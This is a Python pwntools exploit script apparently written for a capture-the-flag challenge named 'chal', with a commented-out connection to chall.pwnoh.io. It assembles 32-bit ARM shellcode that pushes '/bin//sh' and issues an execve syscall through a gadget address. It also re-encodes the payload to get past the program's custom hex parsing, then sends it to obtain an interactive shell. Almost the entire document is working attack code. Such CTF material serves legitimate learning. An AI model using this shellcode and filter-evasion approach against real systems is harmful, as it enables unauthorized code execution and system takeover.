#!/bin/python3
from pwn import *
EXPLOIT = 1
context.update(arch='arm',os='linux',bits='32')
context.terminal = ['tmux', 'new-window']

def parse_hex(payload):
    res = []
    i = 0
    while i < len(payload):
        res.append(hex((payload[i] % 32 + 9) % 25 * 16 + (payload[i + 1] % 32 + 9) % 25))
        i += 2
    return res

def pre_parse(input):
    output = b''
    for c in input:
        # first 4bits
        for y in range(25):
            if (y + 9) % 25 == (c >> 4):
                output += y.to_bytes(1, 'little')
                break
        # second 4bits
        for x in range(25):
            if (x + 9) % 25 == (c & 0b1111):
                output += x.to_bytes(1, 'little')
                break
    return output


nop = asm('nop')
push_str = asm(shellcraft.pushstr('/bin//sh'))
pop = asm('pop {r0}')
r7 = asm('mov r7, 0xb')
ret_addr = asm(shellcraft.mov(src=0x00114db8,dst='r6'))             # 0x00114db8
ret = asm('bx r6')
print(ret)
shell = push_str + pop + r7 + ret_addr + ret


print('shell', shell, len(shell))
# print('payload',enhex(shell))
# print('expected outcome', parse_hex(payload), len(parse_hex(payload)))
# print(len(shell),len(payload))
if EXPLOIT:
    e = ELF('chal')
    io = gdb.debug(e.path, '''
    break * 0xdead0000
    ''')
    #io = process(e.path)
    #io = connect('chall.pwnoh.io', 13375)
    io.recv()
    io.sendline(enhex(shell))
    print(io.recv().decode())
    io.interactive()
